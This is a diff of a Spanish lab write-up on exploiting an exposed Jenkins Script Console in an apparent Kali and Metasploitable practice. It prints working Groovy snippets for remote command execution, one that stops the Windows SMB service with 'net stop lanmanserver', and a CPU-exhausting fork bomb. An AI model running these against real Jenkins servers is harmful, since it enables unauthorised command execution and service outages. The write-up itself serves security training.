@@ -26,6 +26,7 @@ Para la presente práctica, esta situación se simuló colocando Kali y Metasplo
      curl -s -o /dev/null -w "%{http_code}" http://10.0.2.15:8484/
 
 ![KILL2.1.2](/assets/KILL2/KILL2.1.2.png)
+
 ![KILL2.1.3](/assets/KILL2/KILL2.1.3.png)
 
 
@@ -48,14 +49,13 @@ Lo que has demostrado es que desde la Script Console se pueden ejecutar comandos
      proc.waitFor()
      println proc.text
 
-*NOTA 1:* El que salga como resultado: **nt authority\local service** significa que ***Jenkins*** está corriendo como la cuenta integrada de Windows llamada Local Service.
-
-*NOTA 2:* La explotación permitió la ejecución remota de comandos a través de Jenkins. El comando **whoami** reveló que los procesos se ejecutaban bajo la cuenta **NT AUTHORITY\LOCAL SERVICE**, indicando que la aplicación operaba con **privilegios restringidos** y no con privilegios administrativos."
-
-Para ejecutar comandos del sistema operativo más complejos:
-
 ![KILL2.2.3](/assets/KILL2/KILL2.2.3.png)
 ![KILL2.2.4](/assets/KILL2/KILL2.2.4.png)
+
+**NOTA 1:** El que salga como resultado: **nt authority\local service** significa que ***Jenkins*** está corriendo como la cuenta integrada de Windows llamada Local Service.
+
+**NOTA 2:** La explotación permitió la ejecución remota de comandos a través de Jenkins. El comando **whoami** reveló que los procesos se ejecutaban bajo la cuenta **NT AUTHORITY\LOCAL SERVICE**, indicando que la aplicación operaba con **privilegios restringidos** y no con privilegios administrativos."
+
 
 ## **4. IMPACTO: DENEGACIÓN DE SERVICIO (DoS)**
 ## 4.1. Detener el propio servicio Jenkins:
@@ -74,6 +74,7 @@ Se utilizó: Groovy de Jenkins
 
 Detener el servidor de archivos SMB
 Código en Groovy:
+
      "cmd /c net stop lanmanserver".execute()
 
 ![KILL2.2.6](/assets/KILL2/KILL2.2.6.png)
@@ -88,6 +89,7 @@ Código en Groovy:
 ## 4.3. Agotar CPU (fork bomb en Groovy):
 
 Código en Groovy:
+
      while (true) {
          Thread.start { while (true) {} }
      }
